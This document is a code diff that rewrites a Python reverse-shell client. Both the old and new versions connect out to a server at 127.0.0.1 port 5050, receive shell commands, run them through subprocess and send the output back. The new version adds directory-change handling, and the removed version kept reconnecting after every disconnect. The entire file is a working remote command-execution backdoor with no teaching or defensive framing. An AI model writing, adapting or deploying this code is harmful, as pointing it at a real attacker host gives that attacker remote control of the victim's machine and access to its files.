@@ -1,58 +1,46 @@
 import os
-import time
-import socket 
-import threading
+import socket
 import subprocess
+import sys
 
-SERVER_HOST = "127.0.0.1"
-SERVER_PORT = 5050
-BUFFER_SIZE = 1024
-
-def pwd():
-    cwd = "cwd="+os.getcwd()
-    return cwd.encode("utf-8")
-
-def worker():
-    # Try to connect
-    s = socket.socket()
+def receiver(s):
+    """Receive system commands and execute them."""
     while True:
-        try:
-            s.connect((SERVER_HOST, SERVER_PORT))
-            print("Connected!")
-            break
-        except Exception as e:
-            print("Connection Error: " + str(e))
-            time.sleep(2)
+        cmd_bytes = s.recv(4096) # 4096 is better for heavy transfers!
+        cmd = cmd_bytes.decode("utf-8")
+        if cmd.startswith("cd "):
+            os.chdir(cmd[3:])
+            x1 = f'{os.getcwd()}>'
+            s.send(x1.encode())
             continue
+        if len(cmd) == 2 and ":" in cmd:
+            os.chdir(cmd)
+            x2 = f'{os.getcwd()}>'
+            s.send(x2.encode())
 
-    # Welcome message
-    message = s.recv(BUFFER_SIZE).decode("utf-8")
-    print("Server:", message)
-    s.send(pwd())
+        if len(cmd) > 0:
+            p = subprocess.run(cmd, shell=True, capture_output=True)
+            data = p.stdout + p.stderr
+            x3 = f'{os.getcwd()}>'
+            s.sendall(data + x3.encode())
 
-    # Get new commands
-    while True:
-        command = s.recv(BUFFER_SIZE).decode("utf-8")
-        if command.lower() == "exit" or len(command) == 0:
-            break
+def connect(address):
+    """Establish a connection to the address, then call receiver()"""
+    try:
+        s = socket.socket()
+        s.connect(address)
+        print("Connection Established.")
+        print(f"Address: {address}")
+        x5 = f'{os.getcwd()}>'
+        s.send(x5.encode())
 
-        output = subprocess.getoutput(command)
+    except socket.error as error:
+        print("Something went wrong... more info below.")
+        print(error)
+        sys.exit()
+    receiver(s)
 
-        s.send(output.encode("utf-8"))
-        s.send(pwd())
-
-    print("Connection Closed")
-    s.close()
-
-# Run the client
-if __name__ == '__main__':
-    while True:
-        try:
-            print("Creating new worker...")
-            t = threading.Thread(target=worker)
-            t.start()
-            t.join()
-            print("Worker terminated\n")
-        except KeyboardInterrupt:
-            print("SIGINT received")
-            continue
+if __name__ == "__main__":
+    host = "127.0.0.1"
+    port = 5050
+    connect((host, port))
